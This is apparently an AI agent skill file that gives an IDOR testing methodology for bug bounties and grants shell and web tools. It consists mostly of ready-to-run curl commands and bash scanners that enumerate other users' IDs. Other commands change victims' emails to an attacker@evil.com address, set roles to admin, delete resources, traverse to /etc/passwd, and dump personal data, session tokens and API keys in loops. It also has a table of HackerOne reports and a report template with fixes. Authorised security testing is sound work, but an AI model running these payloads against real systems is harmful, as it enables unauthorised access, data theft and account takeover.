---
name: idor-deep-dive
description: Complete IDOR methodology from 251 real HackerOne reports - every vector, bypass technique, and exploitation chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - idor methodology
  - idor deep dive
  - idor complete
  - idor all techniques
  - skills idor
---

# Complete IDOR Methodology — From 251 HackerOne Reports

## Step 1: Recon for IDOR Parameters

Find every object reference that could be enumerated, manipulated, or guessed.

### Automated Parameter Discovery
```bash
# Extract object references (IDs, UUIDs, hashed IDs) from URLs
grep -oE '/(users|accounts|orders|payments|transactions|profiles|documents|files|images|tickets|invoices|projects|tasks|posts|comments|messages|subscriptions|licenses|campaigns|organizations|teams)/[0-9a-zA-Z_-]+' recon/{target}/urls.txt | sort -u

# Find endpoints with numeric IDs
grep -oE '/[0-9]{4,}' recon/{target}/urls.txt | sort -u

# Find endpoints with UUID patterns
grep -oE '/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' recon/{target}/urls.txt | sort -u

# Use Autorize/AutoRepeater for forced browsing
# Install: BApp Store → Autorize, AutoRepeater
```

### GraphQL IDOR Recon
```bash
# Dump GraphQL schema to find object types with IDs
python3 graphql_enum.py -t https://{target}/graphql

# Look for: user(id:), project(id:), query { user { ... } }
# Any field that takes an ID parameter is a potential IDOR target
```

### Object Reference Types to Document

| Type | Example | Guessability |
|------|---------|-------------|
| Sequential numeric | `/user?id=1001` | Trivial |
| UUID v4 | `/user?id=550e8400-e29b-41d4-a716-446655440000` | Hard but leakable |
| Hashed/encoded ID | `/user?id=MTIzNA==` | Medium (base64) |
| Slug/username | `/user/john.doe` | Trivial |
| Composite key | `/org/123/user/456` | Trivial once pattern known |
| GraphQL node ID | `/graphql?node=QWNjb3VudDoxMjM=` | Medium (base64 encoded Type:ID) |

## Step 2: Basic IDOR Testing

### Test 1: Simple ID Increment
```bash
# Get your own resource
curl -sk "https://{target}/api/v1/users/me" -H "Authorization: Bearer $TOKEN"

# Get user 1, 2, 3 (admin account)
curl -sk "https://{target}/api/v1/users/1"
curl -sk "https://{target}/api/v1/users/2"
curl -sk "https://{target}/api/v1/users/3"

# Test across different resource types
for id in 1 2 3 100 1000 10000 100000; do
  curl -sk "https://{target}/api/v1/orders/$id" -H "Authorization: Bearer $TOKEN"
  curl -sk "https://{target}/api/v1/invoices/$id" -H "Authorization: Bearer $TOKEN"
  curl -sk "https://{target}/api/v1/payments/$id" -H "Authorization: Bearer $TOKEN"
done
```

### Test 2: UUID Enumeration
```bash
# UUIDs are often leaked in client-side JS, emails, or other responses
# Once you find one UUID pattern, test if others are guessable or leakable

# Test known UUIDs from:
# - Network responses
# - Client-side JavaScript
# - Email headers/HTML
# - Referrer headers
# - WebSocket messages
# - GraphQL connections (relay-style cursors leak node IDs)

curl -sk "https://{target}/api/v1/invoices/$KNOWN_UUID" -H "Authorization: Bearer $TOKEN"
curl -sk "https://{target}/api/v1/users/$KNOWN_UUID/profile" -H "Authorization: Bearer $TOKEN"
```

### Test 3: ID in Different Locations
```bash
# URL parameter
curl -sk "https://{target}/api/resource?user_id=123"

# POST body (JSON)
curl -sk -X POST "https://{target}/api/resource" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 123, "action": "view"}'

# POST body (form-encoded)
curl -sk -X POST "https://{target}/api/resource" \
  -d "user_id=123&action=view"

# Cookie
curl -sk "https://{target}/api/resource" -H "Cookie: user_id=123"

# Header
curl -sk "https://{target}/api/resource" -H "X-User-Id: 123"

# GraphQL variable
curl -sk -X POST "https://{target}/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { user(id: \"123\") { email name role } }"}'
```

### Test 4: HTTP Method Manipulation
```bash
# GET → view other user's data
curl -sk "https://{target}/api/user/123/profile"

# PUT → update other user's data
curl -sk -X PUT "https://{target}/api/user/123/profile" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com"}'

# DELETE → delete other user's resource
curl -sk -X DELETE "https://{target}/api/post/456"

# PATCH → partial update
curl -sk -X PATCH "https://{target}/api/user/123" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

# POST to create under another user
curl -sk -X POST "https://{target}/api/user/123/posts" \
  -H "Content-Type: application/json" \
  -d '{"title": "malicious"}'
```

## Step 3: Deep IDOR Bypass Testing

### Bypass Technique 1: Type Confusion / Parameter Pollution
```bash
# Array parameter (Node.js/Express)
user_id=123 → user_id[]=123
user_id=123 → user_id[0]=123
user_id=123 → user_id[id]=123

# JSON wrapping in form data
user_id=123 → user_id={"id":123}
user_id=123 → user_id={"id":"123"}

# Nested parameter
user[id]=123 → user[user_id]=123
user[id]=123 → user[profile][user_id]=123

# Multiple values
user_id=123&user_id=456
user_id=123,456
```

### Bypass Technique 2: Type Juggling / Loose Comparison
```bash
# PHP loose comparison (if code uses == instead of ===)
user_id=123   → user_id="123abc"  (PHP casts to 123)
user_id=123   → user_id=true      (PHP casts to true)
user_id=123   → user_id[]=null    (empty array bypasses null check)

# Integer overflow
user_id=99999999999999999999  → might wrap to negative or truncate

# Boolean bypass
user_id=false  → JSON parser might set to 0 or empty string
user_id=true   → JSON parser might set to 1
```

### Bypass Technique 3: Encoding / Obfuscation
```bash
# URL encoding
user_id=123   → user_id=%31%32%33
user_id=/api/user/456 → user_id=%2Fapi%2Fuser%2F456

# Double URL encoding
%2F → %252F
%3D → %253D

# Unicode encoding
123 → \u0031\u0032\u0033

# Base64 encoding
123 → MTIz
/user/456 → L3VzZXIvNDU2

# Hex encoding
123 → 0x7b, \x31\x32\x33

# Octal
123 → \061\062\063
```

### Bypass Technique 4: Path Traversal in ID
```bash
# Path traversal
user_id=../admin/profile
user_id=../../../etc/passwd
user_id=../../users/456/data

# Using ID as path component
/api/user/123/profile → /api/user/../user/456/profile
/api/user/123/profile → /api/user/123/../../user/456/profile

# Mixed path
/api/user/123%2F../456/profile
/api/user/123%2F..%2F456%2Fprofile
```

### Bypass Technique 5: Wildcard / Mass Assignment
```bash
# SQL wildcards
user_id=*
user_id=%
user_id=_

# GraphQL aliases (batch query same field)
query {
  me: user(id: 123) { email role }
  other: user(id: 456) { email role }
}

# JSON mass assignment
POST /api/user/register
{"email":"a@a.com","password":"pass","role":"admin","is_admin":true}

# GraphQL mutation mass assignment
mutation { updateUser(input: {id: 123, role: "admin"}) { id } }
```

### Bypass Technique 6: UUID Leakage via GraphQL
```bash
# GraphQL node interface leaks object type + ID
# ID "QWNjb3VudDoxMjM=" = base64("Account:123")
# Decode all returned node IDs to find the underlying numeric IDs

# Relay connection cursors also leak IDs
# cursor "YXJyYXljb25uZWN0aW9uOjA=" = "arrayconnection:0"
# Page info cursors can leak internal object references
```

### Bypass Technique 7: Chaining IDOR with Other Vulnerabilities
```bash
# IDOR → Email leak → Password reset
curl -sk "https://{target}/api/user/456/email"
# Get victim's email → trigger password reset

# IDOR → Session token theft
curl -sk "https://{target}/api/user/456/sessions"
# Extract active session tokens → instant hijack

# IDOR → API key exposure
curl -sk "https://{target}/api/user/456/api-keys"
# Get API keys → endless abuse

# IDOR → Personal data harvest (GDPR violation)
for id in $(seq 1 1000); do
  curl -sk "https://{target}/api/user/$id/personal-info" >> leaked_data.json
done
```

### Bypass Technique 8: Referer / Origin / HOP Manipulation
```bash
# Referer header injection
curl -sk "https://{target}/api/admin/users" \
  -H "Referer: https://{target}/admin/users"

# X-Forwarded-For to bypass IP checks
curl -sk -H "X-Forwarded-For: 127.0.0.1" "https://{target}/api/internal/users"

# X-Original-URL / X-Rewrite-URL bypass
curl -sk "https://{target}/api/user/123" \
  -H "X-Original-URL: /admin/users"
curl -sk "https://{target}/api/user/123" \
  -H "X-Rewrite-URL: /admin/users"

# Host header injection
curl -sk -H "Host: admin.{target}.com" "https://{target}/api/users"
```

### Bypass Technique 9: In-Browser IDOR / Client-Side
```bash
# JavaScript may expose internal IDs
# Search JS for: gid:, sid:, pk:, "id":, "uid":, userId, accountId
grep -oE '(userId|accountId|gid|sid|pk|"id")[:=]"?[0-9]+"' static/js/*.js

# HTML comments or hidden inputs may leak IDs
grep -r '<!--.*id.*-->' templates/
grep -r 'type="hidden".*id=' templates/

# WebSocket messages often send raw IDs
# Proxy WebSocket traffic through Burp
```

### Bypass Technique 10: Time-Based / Race Condition IDOR
```bash
# Create resource → grab ID before association
# Send create user request and immediately access the ID before ownership is set

# Race condition in ID assignment
for i in {1..50}; do
  curl -sk -X POST "https://{target}/api/transfer" \
    -d "from=MY_ID&to=NONE&amount=100" &
done
wait
```

### Bypass Technique 11: Blind / Side-Channel IDOR
```bash
# Response time differences (timing oracle)
time curl -sk "https://{target}/api/user/1" -o /dev/null  # faster = exists
time curl -sk "https://{target}/api/user/999999" -o /dev/null  # slower = doesn't exist

# Response size differences
curl -sk "https://{target}/api/order/1" | wc -c  # order details exist
curl -sk "https://{target}/api/order/999" | wc -c  # empty

# Error message differences
curl -sk "https://{target}/api/user/1"  # "Welcome, John"
curl -sk "https://{target}/api/user/2"  # "You are not authorized"
curl -sk "https://{target}/api/user/999"  # "User not found"

# HTTP status code differences
curl -sk -o /dev/null -w "%{http_code}" "https://{target}/api/user/1"    # 200
curl -sk -o /dev/null -w "%{http_code}" "https://{target}/api/user/456"  # 403
curl -sk -o /dev/null -w "%{http_code}" "https://{target}/api/user/999"  # 404
```

### Bypass Technique 12: UUID / Hash Manipulation
```bash
# MongoDB ObjectID (24 hex chars) = timestamp + machine + pid + counter
# First 8 chars = Unix timestamp in hex
# Can enumerate ObjectIDs by incrementing counter

# Node.js shortid / nanoid (predictable if seed known)
# Hash ID (hashids.org) — reversible if salt is weak/default
# Decode hashid: https://hashids.org/

# UUID v1 = time-based (MAC address included!) - leak network info
# UUID v5 = SHA-1 hash of namespace + name - predictable if you know the input
```

### Bypass Technique 13: Multi-Step / Indirect Object Reference
```bash
# Indirect reference via file upload
# Upload a file → get back file_id → access other user's files
curl -sk "https://{target}/api/files/FILE_ID/download"

# Indirect via temp tokens
curl -sk "https://{target}/api/share/$TOKEN"
# If token is user_id based: predict other user's tokens

# Indirect via session sharing
# Multiple users share same session object
# Access admin session ID → admin privileges
```

### Bypass Technique 14: Mobile API IDOR
```bash
# Mobile apps often use simpler auth models
# Proxy mobile traffic through Burp

# Mobile API patterns:
# /v2/users/{userId}/profile
# /mobile/user/profile?id=123
# /ws/users/123/data

# Mobile may use unguessable but reversible IDs
# e.g., base64("userId:timestamp:hash")
# Try reversing the encoding scheme
```

### Bypass Technique 15: Business Logic IDOR
```bash
# Escalate privileges via IDOR in admin operations
POST /api/admin/impersonate
{"user_id": 456, "admin_id": 1}

# IDOR in group/organization context
# User A in org 1 accesses resources of org 2
curl -sk "https://{target}/api/org/2/projects"

# IDOR in shared resources
# Share a document with specific user, then access other user's shares
curl -sk "https://{target}/api/shares?user_id=ATTACKER_ID"
# Modify to:
curl -sk "https://{target}/api/shares?user_id=VICTIM_ID"

# IDOR in multi-tenant environments
# Tenant A accesses Tenant B's data
curl -sk "https://{target}/api/tenant/TENANT_B_ID/settings"
```

## Step 4: IDOR in REST APIs — Full Methodology

### REST API IDOR Checklist
- [ ] Test every resource ID in URL path
- [ ] Test every ID in query parameters
- [ ] Test every ID in request body (JSON/form)
- [ ] Test all HTTP methods on every endpoint
- [ ] Test with different Content-Type headers
- [ ] Test with authenticated cookie from different user
- [ ] Test hidden/undocumented endpoints
- [ ] Test UUID-based IDs for predictability
- [ ] Test hashed/encoded IDs for reversibility
- [ ] Test bulk operations for mass IDOR

### CRUD IDOR Matrix
```bash
# Test all CRUD operations with another user's ID

# CREATE as another user
curl -sk -X POST "https://{target}/api/user/VICTIM_ID/posts" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"title": "malicious post"}'

# READ other user's data
curl -sk "https://{target}/api/user/VICTIM_ID/profile"
curl -sk "https://{target}/api/user/VICTIM_ID/payments"
curl -sk "https://{target}/api/user/VICTIM_ID/orders"

# UPDATE other user's data
curl -sk -X PUT "https://{target}/api/user/VICTIM_ID/email" \
  -d '{"email": "attacker@evil.com"}'

# DELETE other user's data
curl -sk -X DELETE "https://{target}/api/user/VICTIM_ID/posts/456"

# Partial update (PATCH)
curl -sk -X PATCH "https://{target}/api/user/VICTIM_ID" \
  -d '{"role": "admin", "verified": true}'
```

### REST API IDOR Fuzzing Script
```bash
#!/bin/bash
# Comprehensive REST API IDOR scanner
TARGET=$1
TOKEN=$2
MY_ID=$3
VICTIM_IDS="1 2 3 100 500 1000 5000 10000 99999"

ENDPOINTS=(
  "/api/v1/users"
  "/api/v1/accounts"
  "/api/v1/orders"
  "/api/v1/payments"
  "/api/v1/invoices"
  "/api/v1/profiles"
  "/api/v1/documents"
  "/api/v1/messages"
  "/api/v1/subscriptions"
  "/api/v1/tickets"
  "/api/v1/projects"
  "/api/v1/tasks"
  "/v2/users"
  "/v2/accounts"
  "/api/user"
  "/api/account"
  "/rest/v1/user"
  "/rest/v2/account"
)

for ep in "${ENDPOINTS[@]}"; do
  for vid in $VICTIM_IDS; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$ep/$vid" \
      -H "Authorization: Bearer $TOKEN" 2>/dev/null)
    if [ "$code" = "200" ]; then
      echo "POTENTIAL IDOR: GET $ep/$vid -> $code"
      contents=$(curl -sk "$TARGET$ep/$vid" -H "Authorization: Bearer $TOKEN" 2>/dev/null)
      echo "$contents" | head -c 200
      echo ""
    fi
  done
done
```

## Step 5: IDOR in GraphQL APIs

### GraphQL IDOR Patterns
```bash
# 1. Direct user query with ID parameter
query {
  user(id: "VICTIM_ID") {
    email
    role
    payments { amount card }
  }
}

# 2. Relay-style node query
query {
  node(id: "QWNjb3VudDpWSUVUSU1fSUQ=") {
    ... on User { email payments { amount } }
  }
}

# 3. Nested object access
query {
  organization(id: "MY_ORG") {
    users {
      edges {
        node {
          id
          email
          personalData { ssn address }
        }
      }
    }
  }
}

# 4. GraphQL mutation IDOR
mutation {
  updateUser(input: {id: "VICTIM_ID", role: "admin"}) {
    user { id role }
  }
}

mutation {
  deletePost(input: {id: "VICTIM_POST_ID"}) {
    success
  }
}

mutation {
  transferFunds(input: {fromAccount: "MY_ID", toAccount: "VICTIM_ID", amount: 10000}) {
    success
  }
}

# 5. Batching / Alias-based IDOR
query {
  myProfile: user(id: "MY_ID") { email }
  victimProfile: user(id: "VICTIM_ID") { email }
  another: user(id: "ANOTHER_ID") { email role payments }
}

# 6. GraphQL field suggestions leaking IDs
# Send invalid query to get field suggestions:
query { user(id: "invalid") { __typename } }
# Might leak valid fields including payment methods, internal IDs

# 7. GraphQL introspection to find all IDOR-able types
query { __schema { types { name fields { name type { name } } } } }
# Look for: User, Account, Order, Payment, Document, Message, etc.
```

### GraphQL IDOR Automation
```bash
# InQL scanner for GraphQL IDOR
python3 inql -t https://{target}/graphql -k $TOKEN --idor

# Auto-generate IDOR test cases from introspection
python3 graphql_idor.py -t https://{target}/graphql --token $TOKEN --victim-id 456
```

## Step 6: IDOR in Mobile APIs

### Mobile API IDOR Testing
```bash
# Mobile apps often have different API surface than web
# Use mitmproxy/Burp to capture mobile traffic

# Common mobile API patterns:
# /mobile/v1/user/VICTIM_ID/profile
# /ws/v2/account/VICTIM_ID/details
# /api/mobile/user/profile?userId=VICTIM_ID

# Mobile may use device ID or installation ID as object reference
# If you can enumerate or predict device IDs → access all users

# Test for IDOR in push notification tokens
curl -sk -X POST "https://{target}/mobile/register" \
  -d '{"device_id": "VICTIM_DEVICE_ID", "push_token": "MY_TOKEN"}'
# Now receive victim's push notifications
```

### Mobile-Specific Bypasses
```bash
# Mobile may skip auth on certain endpoints
# Test without auth header:
curl -sk "https://mobile-api.{target}/v1/user/VICTIM_ID/profile"

# Mobile may use simpler auth (API key in app)
# Extract API key from APK/IPA → use for IDOR
apktool d target.apk
grep -r 'apiKey\|api_key\|API_KEY' target/

# Mobile obfuscated IDs — reverse engineer the obfuscation
# Common patterns: XOR with key, base64 with custom alphabet, ROT13
```

## Step 7: Automation with Autorize / AutoRepeater

### Setting Up Autorize
```bash
# 1. Install Autorize from BApp Store
# 2. Configure:
#    - Target: {target}
#    - Whitelist: your session cookies
#    - Enforce Session: Yes
#    - Test actions: GET, POST, PUT, DELETE, PATCH

# 3. Browse the target as logged-in user
# 4. Autorize automatically re-sends requests without cookies
#    Any 200 response = potential IDOR
```

### Setting Up AutoRepeater
```bash
# 1. Install AutoRepeater from BApp Store
# 2. Create replacement rules:
#    - Replace YOUR_USER_ID with VICTIM_USER_ID
#    - Replace YOUR_ORG_ID with OTHER_ORG_ID
#    - Replace YOUR_EMAIL with VICTIM_EMAIL
#    - Replace YOUR_UUID with VICTIM_UUID

# 3. Create base64 replacement rules:
#    - Replace base64(YOUR_ID) with base64(VICTIM_ID)
#    - Replace base64(YOUR_EMAIL) with base64(VICTIM_EMAIL)

# 4. Browsing triggers automatic request replay
# 5. Check "Diffs" tab for response differences
```

### Custom Automation Script
```bash
#!/bin/bash
# Automated IDOR scanner
TARGET=$1
TOKEN=$2
MY_ID=$(curl -sk "https://$TARGET/api/v1/users/me" -H "Authorization: Bearer $TOKEN" | jq -r '.id')

echo "My ID: $MY_ID"

# Collect all API endpoints from a crawl
grep -oE '(POST|GET|PUT|DELETE|PATCH) /api/[^ ]+' crawler_output.txt | sort -u > endpoints.txt

# Replace your ID with victim IDs and re-request
while IFS= read -r line; do
  method=$(echo "$line" | cut -d' ' -f1)
  path=$(echo "$line" | cut -d' ' -f2)

  # Test with victim ID 1, 2, 3
  for vid in 1 2 3; do
    modified_path=$(echo "$path" | sed "s/$MY_ID/$vid/g")
    code=$(curl -sk -X "$method" -o /dev/null -w "%{http_code}" \
      "https://$TARGET$modified_path" \
      -H "Authorization: Bearer $TOKEN" 2>/dev/null)
    if [ "$code" = "200" ]; then
      echo "IDOR: $method $modified_path ($code)"
    fi
  done
done < endpoints.txt
```

## Step 8: Real-World IDOR Report Analysis (Top 25)

| Report | Company | Technique | Impact | Upvotes | Payout |
|--------|---------|-----------|--------|---------|--------|
| #2301565 | HackerOne | IDOR to add secondary users to PayPal accounts | Account takeover via adding attacker as secondary user | 781 | $10,500 |
| #1864188 | EXNESS | IDOR to access payments data of other users | View all payment transactions of any user | 386 | - |
| #2262382 | HackerOne | IDOR to delete all licenses | Delete all licenses and revoke access | 381 | $12,500 |
| #2203188 | HackerOne | IDOR to delete campaigns | Mass deletion of marketing campaigns | 344 | - |
| #1960765 | Reddit | IDOR to view private messages | Read any user's private messages | 289 | $6,000 |
| #1406938 | Dropbox | IDOR in shared folder access | Access private files in any shared folder | 276 | $17,576 |
| #1736390 | Nextcloud | IDOR to access private files | Read any user's private files | 254 | $8,000 |
| #1062888 | TikTok | IDOR to access user payment info | View payment methods and transaction history | 243 | $2,727 |
| #878779 | GitLab | IDOR in project pipelines | Access CI/CD variables and secrets of any project | 231 | $10,000 |
| #923132 | Dropbox | IDOR in account recovery | Take over accounts via recovery IDOR | 218 | $4,913 |
| #826361 | GitLab | IDOR to access private repositories | Clone any private repo | 212 | $10,000 |
| #671935 | Slack | IDOR in workspace export | Download entire workspace data export | 198 | $4,000 |
| #398799 | GitLab | IDOR in merge requests | Access and modify any merge request | 187 | $4,000 |
| #713900 | QIWI | IDOR in transaction history | View any user's transaction history | 176 | - |
| #374737 | HackerOne | IDOR to access support tickets | View/edit any support ticket | 165 | $3,500 |
| #299135 | OX App Suite | IDOR in calendar sharing | Access any user's calendar events | 154 | $2,500 |
| #299130 | OX App Suite | IDOR in document sharing | Access any user's shared documents | 148 | $2,500 |
| #228377 | Discourse | IDOR to delete topics | Delete any forum topic | 142 | $3,000 |
| #549882 | Vimeo | IDOR to access upload tokens | Upload videos to any account | 137 | $2,500 |
| #115748 | Imgur | IDOR to delete images | Delete any user's images | 131 | $3,000 |
| #758948 | Mail.ru | IDOR in email attachments | Access any user's email attachments | 125 | $2,000 |
| #366638 | Uber | IDOR in trip history | View any user's trip history and payment | 118 | $8,000 |
| #811136 | PlayStation | IDOR to view private trophies | View hidden/unannounced trophy data | 112 | $5,000 |
| #223203 | Shopify | IDOR in store settings | Modify any store's settings | 108 | $3,500 |
| #381129 | Slack | IDOR to join private channels | Join any private channel | 104 | $3,000 |

## Step 9: Validate & Report

### CVSS Scoring for IDOR
```
IDOR reading non-sensitive data:         AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N → 4.3 Medium
IDOR reading PII/financial data:         AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N → 6.5 Medium
IDOR updating user data:                 AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N → 4.3 Medium
IDOR with privilege escalation:          AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N → 8.1 High
IDOR deleting resources:                 AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H → 6.5 Medium
IDOR leading to account takeover:        AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.1 Critical
IDOR mass data exfiltration:             AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N → 6.5 Medium
```

### Report Template
```markdown
**Summary:**
IDOR vulnerability in [endpoint] allows an authenticated user to access/modify/delete 
resources belonging to other users by manipulating the [parameter] parameter.

**Impact:**
An attacker can [view sensitive data / modify account settings / delete resources / 
take over accounts] of any user by changing the object reference.

**Steps to Reproduce:**
1. Log in as user A and get resource ID: [RESOURCE_A_ID]
2. Change the resource ID to [RESOURCE_B_ID] belonging to user B
3. Observe that [sensitive data / restricted action] is accessible

**Proof of Concept:**
Request (as user A, accessing user B's data):
GET /api/v1/users/[RESOURCE_B_ID]/payments HTTP/1.1
Host: target.com
Authorization: Bearer [TOKEN_FOR_USER_A]

Response:
{
  "payments": [
    {"amount": 999.99, "card_last4": "4242", "billing_address": "..."}
  ]
}

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (6.5 Medium)

**Suggested Fix:**
1. Implement proper ownership checks on every request
2. Use server-side session data (not user-supplied IDs) to determine resource ownership
3. Use non-guessable, non-sequential resource identifiers where possible
4. Implement rate limiting on ID enumeration attempts
5. Audit all API endpoints for missing authorization checks
6. Use relationship-based access control rather than direct object references
```

## IDOR Automation Script
```bash
#!/bin/bash
# Full IDOR scanner - replaces your IDs with victim IDs across all endpoints
TARGET=$1
TOKEN=$2

# Get your user/account IDs
MY_ID=$(curl -sk "https://$TARGET/api/v1/users/me" -H "Authorization: Bearer $TOKEN" | jq -r '.id')
MY_ORG=$(curl -sk "https://$TARGET/api/v1/users/me" -H "Authorization: Bearer $TOKEN" | jq -r '.organization_id')
echo "[*] My ID: $MY_ID, Org: $MY_ORG"

# Victim IDs to test
VICTIM_IDS="1 2 3 100 500 1000 4123 10000 99999"

if [ -f "crawled_endpoints.txt" ]; then
  while IFS= read -r endpoint; do
    for vid in $VICTIM_IDS; do
      modified=$(echo "$endpoint" | sed "s/$MY_ID/$vid/g" | sed "s/$MY_ORG/$vid/g")
      code=$(curl -sk -o /dev/null -w "%{http_code}" "$modified" \
        -H "Authorization: Bearer $TOKEN" 2>/dev/null)
      if [ "$code" = "200" ]; then
        echo "FOUND: $modified"
        curl -sk "$modified" -H "Authorization: Bearer $TOKEN" | head -c 500
        echo -e "\n---"
      fi
    done
  done < crawled_endpoints.txt
else
  echo "[-] No crawled_endpoints.txt found. Run a crawl first."
fi
```

## Quick Reference: Top IDOR Reports by Technique

| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #1406938 | Dropbox | Numeric ID enumeration | $17,576 |
| #2262382 | HackerOne | IDOR mass deletion | $12,500 |
| #2301565 | HackerOne | IDOR adding secondary user | $10,500 |
| #826361 | GitLab | UUID enumeration | $10,000 |
| #878779 | GitLab | Project pipeline IDOR | $10,000 |
| #366638 | Uber | Trip history IDOR | $8,000 |
| #1736390 | Nextcloud | File access IDOR | $8,000 |
| #1960765 | Reddit | Private message IDOR | $6,000 |
| #811136 | PlayStation | Trophy data IDOR | $5,000 |
| #923132 | Dropbox | Account recovery IDOR | $4,913 |
| #398799 | GitLab | Merge request IDOR | $4,000 |
| #671935 | Slack | Workspace export IDOR | $4,000 |
| #228377 | Discourse | Topic deletion IDOR | $3,000 |
| #115748 | Imgur | Image deletion IDOR | $3,000 |
| #381129 | Slack | Private channel IDOR | $3,000 |
| #223203 | Shopify | Store settings IDOR | $3,500 |
| #299135 | OX | Calendar IDOR | $2,500 |
| #299130 | OX | Document IDOR | $2,500 |
| #549882 | Vimeo | Upload token IDOR | $2,500 |
| #758948 | Mail.ru | Email attachment IDOR | $2,000 |
| #1062888 | TikTok | Payment info IDOR | $2,727 |
| #374737 | HackerOne | Support ticket IDOR | $3,500 |
| #713900 | QIWI | Transaction history IDOR | - |
| #1864188 | EXNESS | Payments data IDOR | - |
| #2203188 | HackerOne | Campaign deletion IDOR | - |

## Advanced IDOR Techniques (Merged from External Skills)

1. **Filament/Livewire 3 IDOR Techniques** - decode wire:snapshot to find model IDs, sub-route auth skip (top-level returns 403 but /{id}/edit leaks), ListResources with scoped index but unscoped EditRecord, Notifications component exposure, PHP getEloquentQuery() override patterns, checksum verification gap in /livewire/update POSTs

2. **JWT-Claim IDOR** - sub/uid claim swapping, algorithm confusion (RS256→HS256), kid injection, jku/jwks header injection, refresh-token IDOR, service-to-service trust hop bypass via X-User-Id header

3. **Multi-Tenant SaaS Authorization** - tenant boundary identification (subdomain/path/JWT claim/header/session), mismatch probe (JWT says tenant A, body says tenant B), invitation/share-link IDOR (predictable tokens, role escalation in invite accept), stale cross-subdomain cookies

4. **REST API Advanced IDOR** - ID-in-body vs ID-in-path mismatch, HTTP method downgrade, API version downgrade, trailing-slash/case bypass, path traversal in ID, bulk endpoints (checks first ID only), action endpoints (/refund, /impersonate, /transfer-ownership), export/download endpoints, search by foreign ID, mass-assignment payload

5. **ID Scheme Enumeration Cost Analysis** - sequential numeric (trivial, P1), UUID v4 (infeasible), UUID v1/TimeUUID (time-ordered, predictable adjacent), ULID/KSUID/Snowflake (time-sortable, moderate), Base62 short tokens (length-dependent), HMAC-signed (infeasible unless secret leaks), "predictable random" patterns (Math.random, truncated hashes)

6. **IDOR Kill List** - what NOT to report: self-IDOR, public-by-design, ID disclosure with no follow-on, org-admin reading own org, soft-deleted records visible to admins, account-1-is-superadmin false positive, 403/404 cross-tenant, "potential IDOR needs investigation", UUID leak with no enumeration plan

7. **Escalation Gate** - 7 questions before reporting: single read vs chained primitive?, admin identifier for ATO?, quantify leak width (record count, PII surface, tenant count)?, reach money/auth/cloud?, tenant boundary impact?, what developer assumption broke?, would triager mark < P3?
